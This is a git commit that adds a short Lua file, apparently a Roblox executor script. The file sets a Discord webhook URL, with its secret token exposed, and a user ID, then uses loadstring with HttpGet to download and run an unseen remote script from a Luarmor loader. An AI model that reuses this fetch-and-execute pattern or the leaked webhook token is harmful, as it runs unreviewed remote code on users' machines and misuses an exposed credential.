c8dc878e878e5e70300cd5fed1eb4b9758131c29
Ocean <156903851+Oceandek@users.noreply.github.com>
2024-10-23 17:13:27 +0200

    Create backroom.lua

---
+++ backroom.lua
@@ -0,0 +1,5 @@
+getgenv().Config = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1298665576922611835/0NB09b3xtYgbFP7NL0Q_UhAs_H_6Uf9H7_LoaKHpq4vHxeOYkKBw0wTfmcAnCmLZbitd",
+    ["UserID"] = "683695252481245216",
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0d7f3a5ec8122fd45e395c3a9d4bf7ae.lua"))()
